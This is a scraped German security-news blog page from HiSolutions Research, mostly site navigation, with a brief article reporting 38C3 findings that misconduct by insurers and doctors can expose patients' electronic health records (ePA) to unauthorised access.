[HAFNIUM](https://research.hisolutions.com/tag/hafnium/)
[Incident Response](https://research.hisolutions.com/tag/incident-response/)
[KI](https://research.hisolutions.com/tag/ki/)
[KRITIS](https://research.hisolutions.com/tag/kritis/)
[Künstliche Intelligenz](https://research.hisolutions.com/tag/kuenstliche-intelligenz/)
[Linux](https://research.hisolutions.com/tag/linux/)
[Malware](https://research.hisolutions.com/tag/malware/)
[Microsoft](https://research.hisolutions.com/tag/microsoft/)
[Pandemie](https://research.hisolutions.com/tag/pandemie/)
[Passwort](https://research.hisolutions.com/tag/passwort/)
[Penetrationstest](https://research.hisolutions.com/tag/penetrationstest/)
[Phishing](https://research.hisolutions.com/tag/phishing/)
[ProxyLogon](https://research.hisolutions.com/tag/proxylogon/)
[Quantencomputer](https://research.hisolutions.com/tag/quantencomputer/)
[Ransomware](https://research.hisolutions.com/tag/ransomware/)
[Safety](https://research.hisolutions.com/tag/safety/)
[Schadsoftware](https://research.hisolutions.com/tag/schadsoftware/)
[Schwachstelle](https://research.hisolutions.com/tag/schwachstelle/)
[Security](https://research.hisolutions.com/tag/security/)
[Server](https://research.hisolutions.com/tag/server/)
[Shitrix](https://research.hisolutions.com/tag/shitrix/)
[Sicherheitslücken](https://research.hisolutions.com/tag/sicherheitsluecken/)
[Supply Chain Security](https://research.hisolutions.com/tag/supply-chain-security/)
[Trojaner](https://research.hisolutions.com/tag/trojaner/)
[Verschlüsselung](https://research.hisolutions.com/tag/verschluesselung/)
[Vulnerability](https://research.hisolutions.com/tag/vulnerability/)
[Zeroday](https://research.hisolutions.com/tag/zeroday/)

* [Advisories](https://research.hisolutions.com/category/advisories/) (25)
* [Allgemein](https://research.hisolutions.com/category/allgemein/) (72)
* [Digital Workplace](https://research.hisolutions.com/category/digital-workplace/) (1)
* [Forensics](https://research.hisolutions.com/category/forensics/) (1)
* [ITSM](https://research.hisolutions.com/category/itsm/) (1)
* [News](https://research.hisolutions.com/category/news/) (393)
* [Publikationen](https://research.hisolutions.com/category/publikationen/) (4)
  + [Kolumne](https://research.hisolutions.com/category/publikationen/kolumne/) (2)
* [Themen](https://research.hisolutions.com/category/themen/) (115)
  + [Blockchain](https://research.hisolutions.com/category/themen/blockchain/) (2)
  + [Cloud](https://research.hisolutions.com/category/themen/cloud/) (9)
  + [Corona](https://research.hisolutions.com/category/themen/corona/) (4)
  + [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/) (7)
  + [ICS](https://research.hisolutions.com/category/themen/ics/) (1)
  + [Incidents](https://research.hisolutions.com/category/themen/incidents/) (18)
    - [Hafnium](https://research.hisolutions.com/category/themen/incidents/hafnium/) (10)
    - [Log4Shell](https://research.hisolutions.com/category/themen/incidents/log4shell/) (3)
  + [ISMS](https://research.hisolutions.com/category/themen/isms/) (1)
  + [KI/ML](https://research.hisolutions.com/category/themen/ki-ml/) (6)
  + [KMU](https://research.hisolutions.com/category/themen/kmu/) (1)
  + [Kritis](https://research.hisolutions.com/category/themen/kritis/) (6)
  + [Kryptographie](https://research.hisolutions.com/category/themen/kryptographie/) (7)
  + [Malware](https://research.hisolutions.com/category/themen/malware/) (5)
  + [Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/) (7)
  + [OSINT](https://research.hisolutions.com/category/themen/osint/) (1)
  + [Passwörter](https://research.hisolutions.com/category/themen/passwoerter/) (4)
  + [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/) (7)
  + [Phishing](https://research.hisolutions.com/category/themen/phishing/) (3)
  + [Ransomware](https://research.hisolutions.com/category/themen/ransomware/) (8)
  + [Red Teaming](https://research.hisolutions.com/category/themen/red-teaming/) (1)
  + [Risikomanagement](https://research.hisolutions.com/category/themen/risikomanagement/) (6)
  + [SASE](https://research.hisolutions.com/category/themen/sase/) (1)
  + [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/) (26)
  + [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/) (7)
  + [Supply Chain](https://research.hisolutions.com/category/themen/supply-chain/) (3)
  + [Weiterbildung](https://research.hisolutions.com/category/themen/weiterbildung/) (2)
  + [Zeroday](https://research.hisolutions.com/category/themen/zeroday/) (6)
* [Threat Intelligence](https://research.hisolutions.com/category/threat-intelligence/) (1)
* [Veranstaltungen](https://research.hisolutions.com/category/veranstaltungen/) (3)
### Hier schreiben

* ![Abraham Söyler](data:image/gif;base64...)![Abraham Söyler](https://research.hisolutions.com/wp-content/uploads/2024/10/Abraham-Soeyler_Business-200x200.jpg)

  [Abraham Söyler](https://research.hisolutions.com/author/soeyler/ "Abraham Söyler")
* ![Cass Rebbelin](data:image/gif;base64...)![Cass Rebbelin](https://research.hisolutions.com/wp-content/uploads/2023/12/Cass-Rebbelin_Business-150x150.jpg)

  [Cass Rebbelin](https://research.hisolutions.com/author/rebbelin/ "Cass Rebbelin")
* ![Constantin Kirsch - HiSolutions AG](data:image/gif;base64...)![Constantin Kirsch - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Constantin-Kirsch_200x200_intern.jpg)

  [Constantin Kirsch](https://research.hisolutions.com/author/constantink/ "Constantin Kirsch")
* ![Daniel Jedecke - HiSolutions](data:image/gif;base64...)![Daniel Jedecke - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Daniel-Jedecke_200x200_intern.jpg)

  [Daniel Jedecke](https://research.hisolutions.com/author/jedi/ "Daniel Jedecke")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Joerg-Schneider-1.jpg)

  [Dr. Jörg Schneider](https://research.hisolutions.com/author/schneider/ "Dr. Jörg Schneider")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Folker-Schmidt-1-1.jpg)

  [Folker Schmidt](https://research.hisolutions.com/author/folkers/ "Folker Schmidt")
* ![Franz Gläser](data:image/gif;base64...)![Franz Gläser](https://research.hisolutions.com/wp-content/uploads/2025/01/Franz-Gläser_200x200_intern.jpg)

  [Franz Gläser](https://research.hisolutions.com/author/glaeser/ "Franz Gläser")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2022/11/Heike_Knobbe_Blog.jpg)

  [Heike Knobbe](https://research.hisolutions.com/author/knobbe/ "Heike Knobbe")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")
* ![Justus Tartz](data:image/gif;base64...)![Justus Tartz](https://research.hisolutions.com/wp-content/uploads/2024/01/Justus-Tartz_Business-Zuschnitt-150x150.jpg)

  [Justus Tartz](https://research.hisolutions.com/author/justust/ "Justus Tartz")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Lars-Burhop_200x200_intern.jpg)

  [Lars Burhop](https://research.hisolutions.com/author/larsb/ "Lars Burhop")
* ![Lisa Lobmeyer - HiSolutions](data:image/gif;base64...)![Lisa Lobmeyer - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Lisa-Lobmeyer_intern_200x200.jpg)

  [Lisa Lobmeyer](https://research.hisolutions.com/author/lisal/ "Lisa Lobmeyer")
* ![Martin Glaser](data:image/gif;base64...)![Martin Glaser](https://research.hisolutions.com/wp-content/uploads/2023/12/Martin-Glaser_Business-150x150.jpg)

  [Martin Glaser](https://research.hisolutions.com/author/glaser/ "Martin Glaser")
* ![Michael Sehring - HiSolutions](data:image/gif;base64...)![Michael Sehring - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Michael-Sehring_200x200_intern.jpg)

  [Michael Sehring](https://research.hisolutions.com/author/michaels/ "Michael Sehring")
* ![Nicolas Sprenger, HiSolutions AG](data:image/gif;base64...)![Nicolas Sprenger, HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/06/Nicolas-Sprenger_intern_200x200.jpg)

  [Nicolas Sprenger](https://research.hisolutions.com/author/nicolas-sprenger/ "Nicolas Sprenger")
* ![Oliver Saynisch](data:image/gif;base64...)![Oliver Saynisch](https://research.hisolutions.com/wp-content/uploads/2023/07/Oliver-Saynisch_Business-150x150.jpg)

  [Oliver Saynisch](https://research.hisolutions.com/author/saynisch/ "Oliver Saynisch")
* ![Pascal Boxen](data:image/gif;base64...)![Pascal Boxen](https://research.hisolutions.com/wp-content/uploads/2023/07/Pascal-Boxen_Business-150x150.jpg)

  [Pascal Boxen](https://research.hisolutions.com/author/boxen/ "Pascal Boxen")
* ![Ronny Dobra - HiSolutions AG](data:image/gif;base64...)![Ronny Dobra - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Ronny-Dobra_200x200_intern.jpg)

  [Ronny Dobra](https://research.hisolutions.com/author/ronnyd/ "Ronny Dobra")
* ![Torge Ewald](data:image/gif;base64...)![Torge Ewald](https://research.hisolutions.com/wp-content/uploads/2023/07/Torge-Ewald_Original_Business-150x150.jpg)

  [Torge Ewald](https://research.hisolutions.com/author/ewald/ "Torge Ewald")

* [Twitter: @hisolutions](https://twitter.com/hisolutions)
* [LinkedIn](https://de.linkedin.com/company/hisolutions-ag)
* [Xing](https://www.xing.com/companies/hisolutionsag)
* research@hisolutions.com
* [Mastodon](https://infosec.exchange/%40hisolutions)

* [Kontakt](https://research.hisolutions.com/kontakt/)
* [HiSolutions AG](https://www.hisolutions.com)
* [Impressum](https://www.hisolutions.com/impressum/)
* [Datenschutzhinweise](https://www.hisolutions.com/datenschutz)

© 2025 HiSolutions Research. Stolz präsentiert von [Sydney](https://athemes.com/theme/sydney/)



=== Content from research.hisolutions.com_b8b8e917_20250121_012419.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

# Elektronische Patientenakte (ePA): nicht so sicher

Von [Holger von Rhein](https://research.hisolutions.com/author/holger/)[16. Januar 202516. Januar 2025](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)[News](https://research.hisolutions.com/category/news/)
![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2018/10/cropped-HiS_Logo_HintergrungWeiss-1_Research.jpg)

Die elektronische Patientenakte (ePA) soll Anfang 2025 in Deutschland flächendeckend eingeführt werden. Damit erhalten alle gesetzlich Versicherten automatisch eine ePA, sofern sie nicht widersprechen.

Martin Tschirsich und Bianca Kastl zeigten auf dem 38C3 jedoch auf, dass u. a. durch Fehlverhalten von Versicherern und/oder Ärzten bzw. deren Mitarbeitenden unberechtigte Dritte vollen Zugriff auf die Patientenakten einzelner Versicherter erhalten können. Dazu gehörten der Weiterverkauf von Konnektoren/Lesegeräten mit noch gestecktem elektronischen Heilberufsausweis (eHBA) oder Institutionsausweis (SMC-B) sowie der Versand eines eHBA durch Dienstleister oder einer eGK durch Versicherungen an eine fremde Adresse.

Solange solche Angriffsvektoren nicht ausreichend adressiert werden, werden die Stimmen, die vor einer Einführung warnen, laut bleiben.

<https://aerzteblatt.de/nachrichten/156770/Aerzte-sorgen-sich-um-Datenschutz-bei-elektronischer-Patientenakte>

<https://bvkj.de/politik-und-presse/pressemitteilung/schwachstellen-in-der-epa-bvkj-fordert-datensicherheit-fuer-kinder-und-jugendliche/>

<https://heise.de/news/Kurz-vor-Start-Immer-mehr-Experten-warnen-vor-elektronischer-Patientenakte-10235091.html>

## Autor

* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")

  Kryptographie

  [Alle Beiträge ansehen](https://research.hisolutions.com/author/holger/ "Alle Beiträge ansehen")

## Beitragsnavigation

[Wie funktioniert eigentlich Malware auf Handys?](https://research.hisolutions.com/2025/01/wie-funktioniert-eigentlich-malware-auf-handys/)[Freigiebiger Datenreichtum bei VW](https://research.hisolutions.com/2025/01/freigiebiger-datenreichtum-bei-vw/)

* [Elektronische Patientenakte (ePA): nicht so sicher](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)16. Januar 2025
* [NSO vs. Whatsapp](https://research.hisolutions.com/2025/01/nso-vs-whatsapp/)16. Januar 2025
* [Windows-BitLocker-Probleme](https://research.hisolutions.com/2025/01/windows-bitlocker-probleme/)16. Januar 2025
* [Wahlsoftware 2.0](https://research.hisolutions.com/2025/01/wahlsoftware-2-0/)16. Januar 2025
* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
* [Seitenkanal des Monats: Wenn die Handy-Rückseite vibriert](https://research.hisolutions.com/2024/11/seitenkanal-des-monats-wenn-die-handy-rueckseite-vibriert/)14. November 2024
* [Sieht der Fernseher mit?](https://research.hisolutions.com/2024/10/sieht-der-fernseher-mit/)17. Oktober 2024

[Angriff](https://research.hisolutions.com/tag/angriff/)
[Black hat](https://research.hisolutions.com/tag/black-hat/)
[Browser](https://research.hisolutions.com/tag/browser/)
[BSI](https://research.hisolutions.com/tag/bsi/)
[Cloud](https://research.hisolutions.com/tag/cloud/)
[Corona](https://research.hisolutions.com/tag/corona/)
[CVE](https://research.hisolutions.com/tag/cve/)
[Cyberangriff](https://research.hisolutions.com/tag/cyberangriff/)
[Cyberattacken](https://research.hisolutions.com/tag/cyberattacken/)
[Cybersecurity](https://research.hisolutions.com/tag/cybersecurity/)
[Datenschutz](https://research.hisolutions.com/tag/datenschutz/)
[Emotet](https://research.hisolutions.com/tag/emotet/)
[Exchange](https://research.hisolutions.com/tag/exchange/)
[Hacker](https://research.hisolutions.com/tag/hacker/)
[Hackerangriff](https://research.hisolutions.com/tag/hackerangriff/)
[HAFNIUM](https://research.hisolutions.com/tag/hafnium/)
[Incident Response](https://research.hisolutions.com/tag/incident-response/)
[KI](https://research.hisolutions.com/tag/ki/)
[KRITIS](https://research.hisolutions.com/tag/kritis/)
[Künstliche Intelligenz](https://research.hisolutions.com/tag/kuenstliche-intelligenz/)
[Linux](https://research.hisolutions.com/tag/linux/)
[Malware](https://research.hisolutions.com/tag/malware/)
[Microsoft](https://research.hisolutions.com/tag/microsoft/)
[Pandemie](https://research.hisolutions.com/tag/pandemie/)
[Passwort](https://research.hisolutions.com/tag/passwort/)
[Penetrationstest](https://research.hisolutions.com/tag/penetrationstest/)
[Phishing](https://research.hisolutions.com/tag/phishing/)
[ProxyLogon](https://research.hisolutions.com/tag/proxylogon/)
[Quantencomputer](https://research.hisolutions.com/tag/quantencomputer/)
[Ransomware](https://research.hisolutions.com/tag/ransomware/)
[Safety](https://research.hisolutions.com/tag/safety/)
[Schadsoftware](https://research.hisolutions.com/tag/schadsoftware/)
[Schwachstelle](https://research.hisolutions.com/tag/schwachstelle/)
[Security](https://research.hisolutions.com/tag/security/)
[Server](https://research.hisolutions.com/tag/server/)
[Shitrix](https://research.hisolutions.com/tag/shitrix/)
[Sicherheitslücken](https://research.hisolutions.com/tag/sicherheitsluecken/)
[Supply Chain Security](https://research.hisolutions.com/tag/supply-chain-security/)
[Trojaner](https://research.hisolutions.com/tag/trojaner/)
[Verschlüsselung](https://research.hisolutions.com/tag/verschluesselung/)
[Vulnerability](https://research.hisolutions.com/tag/vulnerability/)
[Zeroday](https://research.hisolutions.com/tag/zeroday/)

* [Advisories](https://research.hisolutions.com/category/advisories/) (25)
* [Allgemein](https://research.hisolutions.com/category/allgemein/) (72)
* [Digital Workplace](https://research.hisolutions.com/category/digital-workplace/) (1)
* [Forensics](https://research.hisolutions.com/category/forensics/) (1)
* [ITSM](https://research.hisolutions.com/category/itsm/) (1)
* [News](https://research.hisolutions.com/category/news/) (393)
* [Publikationen](https://research.hisolutions.com/category/publikationen/) (4)
  + [Kolumne](https://research.hisolutions.com/category/publikationen/kolumne/) (2)
* [Themen](https://research.hisolutions.com/category/themen/) (115)
  + [Blockchain](https://research.hisolutions.com/category/themen/blockchain/) (2)
  + [Cloud](https://research.hisolutions.com/category/themen/cloud/) (9)
  + [Corona](https://research.hisolutions.com/category/themen/corona/) (4)
  + [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/) (7)
  + [ICS](https://research.hisolutions.com/category/themen/ics/) (1)
  + [Incidents](https://research.hisolutions.com/category/themen/incidents/) (18)
    - [Hafnium](https://research.hisolutions.com/category/themen/incidents/hafnium/) (10)
    - [Log4Shell](https://research.hisolutions.com/category/themen/incidents/log4shell/) (3)
  + [ISMS](https://research.hisolutions.com/category/themen/isms/) (1)
  + [KI/ML](https://research.hisolutions.com/category/themen/ki-ml/) (6)
  + [KMU](https://research.hisolutions.com/category/themen/kmu/) (1)
  + [Kritis](https://research.hisolutions.com/category/themen/kritis/) (6)
  + [Kryptographie](https://research.hisolutions.com/category/themen/kryptographie/) (7)
  + [Malware](https://research.hisolutions.com/category/themen/malware/) (5)
  + [Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/) (7)
  + [OSINT](https://research.hisolutions.com/category/themen/osint/) (1)
  + [Passwörter](https://research.hisolutions.com/category/themen/passwoerter/) (4)
  + [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/) (7)
  + [Phishing](https://research.hisolutions.com/category/themen/phishing/) (3)
  + [Ransomware](https://research.hisolutions.com/category/themen/ransomware/) (8)
  + [Red Teaming](https://research.hisolutions.com/category/themen/red-teaming/) (1)
  + [Risikomanagement](https://research.hisolutions.com/category/themen/risikomanagement/) (6)
  + [SASE](https://research.hisolutions.com/category/themen/sase/) (1)
  + [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/) (26)
  + [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/) (7)
  + [Supply Chain](https://research.hisolutions.com/category/themen/supply-chain/) (3)
  + [Weiterbildung](https://research.hisolutions.com/category/themen/weiterbildung/) (2)
  + [Zeroday](https://research.hisolutions.com/category/themen/zeroday/) (6)
* [Threat Intelligence](https://research.hisolutions.com/category/threat-intelligence/) (1)
* [Veranstaltungen](https://research.hisolutions.com/category/veranstaltungen/) (3)
### Hier schreiben

* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")
* ![Abraham Söyler](data:image/gif;base64...)![Abraham Söyler](https://research.hisolutions.com/wp-content/uploads/2024/10/Abraham-Soeyler_Business-200x200.jpg)

  [Abraham Söyler](https://research.hisolutions.com/author/soeyler/ "Abraham Söyler")
* ![Cass Rebbelin](data:image/gif;base64...)![Cass Rebbelin](https://research.hisolutions.com/wp-content/uploads/2023/12/Cass-Rebbelin_Business-150x150.jpg)

  [Cass Rebbelin](https://research.hisolutions.com/author/rebbelin/ "Cass Rebbelin")
* ![Constantin Kirsch - HiSolutions AG](data:image/gif;base64...)![Constantin Kirsch - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Constantin-Kirsch_200x200_intern.jpg)

  [Constantin Kirsch](https://research.hisolutions.com/author/constantink/ "Constantin Kirsch")
* ![Daniel Jedecke - HiSolutions](data:image/gif;base64...)![Daniel Jedecke - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Daniel-Jedecke_200x200_intern.jpg)

  [Daniel Jedecke](https://research.hisolutions.com/author/jedi/ "Daniel Jedecke")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Joerg-Schneider-1.jpg)

  [Dr. Jörg Schneider](https://research.hisolutions.com/author/schneider/ "Dr. Jörg Schneider")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Folker-Schmidt-1-1.jpg)

  [Folker Schmidt](https://research.hisolutions.com/author/folkers/ "Folker Schmidt")
* ![Franz Gläser](data:image/gif;base64...)![Franz Gläser](https://research.hisolutions.com/wp-content/uploads/2025/01/Franz-Gläser_200x200_intern.jpg)

  [Franz Gläser](https://research.hisolutions.com/author/glaeser/ "Franz Gläser")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2022/11/Heike_Knobbe_Blog.jpg)

  [Heike Knobbe](https://research.hisolutions.com/author/knobbe/ "Heike Knobbe")
* ![Justus Tartz](data:image/gif;base64...)![Justus Tartz](https://research.hisolutions.com/wp-content/uploads/2024/01/Justus-Tartz_Business-Zuschnitt-150x150.jpg)

  [Justus Tartz](https://research.hisolutions.com/author/justust/ "Justus Tartz")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Lars-Burhop_200x200_intern.jpg)

  [Lars Burhop](https://research.hisolutions.com/author/larsb/ "Lars Burhop")
* ![Lisa Lobmeyer - HiSolutions](data:image/gif;base64...)![Lisa Lobmeyer - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Lisa-Lobmeyer_intern_200x200.jpg)

  [Lisa Lobmeyer](https://research.hisolutions.com/author/lisal/ "Lisa Lobmeyer")
* ![Martin Glaser](data:image/gif;base64...)![Martin Glaser](https://research.hisolutions.com/wp-content/uploads/2023/12/Martin-Glaser_Business-150x150.jpg)

  [Martin Glaser](https://research.hisolutions.com/author/glaser/ "Martin Glaser")
* ![Michael Sehring - HiSolutions](data:image/gif;base64...)![Michael Sehring - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Michael-Sehring_200x200_intern.jpg)

  [Michael Sehring](https://research.hisolutions.com/author/michaels/ "Michael Sehring")
* ![Nicolas Sprenger, HiSolutions AG](data:image/gif;base64...)![Nicolas Sprenger, HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/06/Nicolas-Sprenger_intern_200x200.jpg)

  [Nicolas Sprenger](https://research.hisolutions.com/author/nicolas-sprenger/ "Nicolas Sprenger")
* ![Oliver Saynisch](data:image/gif;base64...)![Oliver Saynisch](https://research.hisolutions.com/wp-content/uploads/2023/07/Oliver-Saynisch_Business-150x150.jpg)

  [Oliver Saynisch](https://research.hisolutions.com/author/saynisch/ "Oliver Saynisch")
* ![Pascal Boxen](data:image/gif;base64...)![Pascal Boxen](https://research.hisolutions.com/wp-content/uploads/2023/07/Pascal-Boxen_Business-150x150.jpg)

  [Pascal Boxen](https://research.hisolutions.com/author/boxen/ "Pascal Boxen")
* ![Ronny Dobra - HiSolutions AG](data:image/gif;base64...)![Ronny Dobra - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Ronny-Dobra_200x200_intern.jpg)

  [Ronny Dobra](https://research.hisolutions.com/author/ronnyd/ "Ronny Dobra")
* ![Torge Ewald](data:image/gif;base64...)![Torge Ewald](https://research.hisolutions.com/wp-content/uploads/2023/07/Torge-Ewald_Original_Business-150x150.jpg)

  [Torge Ewald](https://research.hisolutions.com/author/ewald/ "Torge Ewald")

* [Twitter: @hisolutions](https://twitter.com/hisolutions)
* [LinkedIn](https://de.linkedin.com/company/hisolutions-ag)
* [Xing](https://www.xing.com/companies/hisolutionsag)
* research@hisolutions.com
* [Mastodon](https://infosec.exchange/%40hisolutions)

* [Kontakt](https://research.hisolutions.com/kontakt/)
* [HiSolutions AG](https://www.hisolutions.com)
* [Impressum](https://www.hisolutions.com/impressum/)
* [Datenschutzhinweise](https://www.hisolutions.com/datenschutz)

© 2025 HiSolutions Research. Stolz präsentiert von [Sydney](https://athemes.com/theme/sydney/)



=== Content from research.hisolutions.com_d1145fae_20250121_012503.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

